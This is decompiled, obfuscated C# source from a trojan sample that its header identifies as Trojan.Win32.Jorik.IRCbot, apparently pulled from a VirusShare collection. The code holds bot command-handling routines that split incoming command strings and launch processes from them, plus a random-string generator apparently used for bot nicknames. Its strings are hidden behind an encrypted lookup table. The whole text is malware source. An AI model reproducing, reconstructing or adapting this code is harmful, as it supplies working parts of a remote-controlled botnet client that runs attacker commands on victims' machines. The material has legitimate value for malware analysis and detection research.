// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u0019;
using \u007F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace \u007F
{
  internal sealed class \u0086
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    public static bool \u0001\u0002([In] string obj0, [In] string obj1)
    {
      bool flag1;
      try
      {
        if (\u0081\u0002.\u007E\u0087\u0002((object) obj1, \u0086.\u0001(1426)))
        {
          string[] strArray = \u0086\u0003.\u009E(obj1, \u0086.\u0001(1426), -1, CompareMethod.Binary);
          bool flag2 = \u007F\u0002.\u0089(strArray[1], obj0, CompareMethod.Binary);
          strArray[0] = \u0010\u0003.\u009C(strArray[0], \u0086.\u0001(209), \u0086.\u0001(133), 1, -1, CompareMethod.Binary);
          bool flag3 = \u007F\u0002.\u0089(strArray[0], obj0, CompareMethod.Binary);
          flag1 = flag2 | flag3;
        }
        else
          flag1 = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag1 = false;
        \u0012\u0003.\u0090();
      }
      return flag1;
    }

    public static bool \u0002\u0002([In] string obj0)
    {
      bool flag;
      try
      {
        string[] strArray1 = \u0086\u0003.\u009E(obj0, \u0086.\u0001(580), -1, CompareMethod.Binary);
        string[] strArray2 = \u0086\u0003.\u009E(strArray1[1], \u0086.\u0001(262), -1, CompareMethod.Binary);
        if (\u0018\u0002.\u0093((Array) strArray2, 1) > 1)
        {
          \u0007\u0003.\u007E\u0013((object) \u008B\u0002.\u007E\u0014((object) \u001B.\u0092()), strArray2[1], strArray2[2]);
          flag = true;
        }
        else
          flag = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    public static bool \u0003\u0002([In] string obj0)
    {
      bool flag;
      try
      {
        Process process = \u0090\u0003.\u009B\u0004(obj0);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    public static bool \u0004\u0002([In] string obj0)
    {
      bool flag;
      try
      {
        string[] strArray1 = \u0086\u0003.\u009E(obj0, \u0086.\u0001(631), -1, CompareMethod.Binary);
        string[] strArray2 = \u0086\u0003.\u009E(strArray1[1], \u0086.\u0001(262), -1, CompareMethod.Binary);
        Process process = \u0090\u0003.\u009B\u0004(strArray2[1]);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    public static void \u0005\u0002([In] string obj0) => \u0084\u0002.\u0098\u0002(\u0089\u0003.\u008B\u0002(\u0086.\u0001(1431), obj0, \u0086.\u0001(1436)));

    public static bool \u0006\u0002([In] string obj0)
    {
      bool flag;
      try
      {
        string[] strArray = \u0086\u0003.\u009E(obj0, \u0086.\u0001(262), -1, CompareMethod.Binary);
        flag = \u0018\u0002.\u0093((Array) strArray, 1) > 0 && \u008A\u0003.\u008E(strArray[1], \u0086.\u0001(1441), false) == 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    public static string \u0007\u0002(int length, int sequence, int casing = 0)
    {
      Random random1 = new Random();
      Random random2 = new Random();
      string str1 = \u0086.\u0001(1446);
      string str2 = \u0086\u0002.\u007E\u0088\u0002((object) str1);
      string str3 = string.Empty;
      while (\u0094.\u007E\u0084\u0002((object) str3) != length)
      {
        char ch;
        switch (casing)
        {
          case 0:
            switch (\u0096\u0002.\u007E\u0008\u0003((object) random1, 0, 2))
            {
              case 0:
                ch = \u008E\u0003.\u0083(\u0083\u0003.\u007E\u0086\u0002((object) str1, \u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 25), 1));
                break;
              case 1:
                ch = \u008E\u0003.\u0083(\u0083\u0003.\u007E\u0086\u0002((object) str2, \u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 25), 1));
                break;
            }
            break;
          case 1:
            ch = \u008E\u0003.\u0083(\u0083\u0003.\u007E\u0086\u0002((object) str2, \u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 25), 1));
            break;
          case 2:
            ch = \u008E\u0003.\u0083(\u0083\u0003.\u007E\u0086\u0002((object) str1, \u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 25), 1));
            break;
        }
        switch (sequence)
        {
          case 0:
            switch (\u0096\u0002.\u007E\u0008\u0003((object) random1, 0, 2))
            {
              case 0:
                str3 = \u008B\u0003.\u008A\u0002(str3, \u0089\u0002.\u0087(\u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 9)));
                break;
              case 1:
                str3 = \u008B\u0003.\u008A\u0002(str3, \u0088\u0003.\u0086(ch));
                ch = char.MinValue;
                break;
            }
            break;
          case 1:
            str3 = \u008B\u0003.\u008A\u0002(str3, \u0089\u0002.\u0087(\u0096\u0002.\u007E\u0008\u0003((object) random2, 0, 9)));
            break;
          case 2:
            str3 = \u008B\u0003.\u008A\u0002(str3, \u0088\u0003.\u0086(ch));
            break;
        }
      }
      return \u008B\u0003.\u008A\u0002(\u0086.\u0001(1483), str3);
    }

    static \u0086() => \u0004.\u008E();
  }
}
